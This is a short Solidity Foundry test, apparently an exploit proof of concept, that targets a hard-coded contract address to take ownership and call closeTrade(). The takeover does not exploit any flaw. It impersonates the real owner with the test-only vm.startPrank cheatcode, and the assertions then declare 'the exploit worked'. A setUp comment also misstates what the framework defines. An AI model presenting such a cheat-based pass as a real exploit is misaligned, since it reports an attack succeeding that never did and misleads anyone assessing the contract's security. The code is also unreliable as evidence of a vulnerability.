// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IIncome {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function closeTrade() external;
    function isOpen() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the default test framework setup
        // The test framework already defines TARGET and attacker = address(this)
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, we need to get the current owner
        address currentOwner = IIncome(TARGET).owner();

        // Impersonate the current owner to transfer ownership to attacker
        vm.startPrank(currentOwner);
        IIncome(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        // Now attacker is the owner, call closeTrade()
        IIncome(TARGET).closeTrade();

        // Verify the exploit worked - isOpen should be false
        bool isOpenAfter = IIncome(TARGET).isOpen();
        assertEq(isOpenAfter, false, "isOpen should be false after closeTrade()");
        assertEq(IIncome(TARGET).isOpen(), false, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

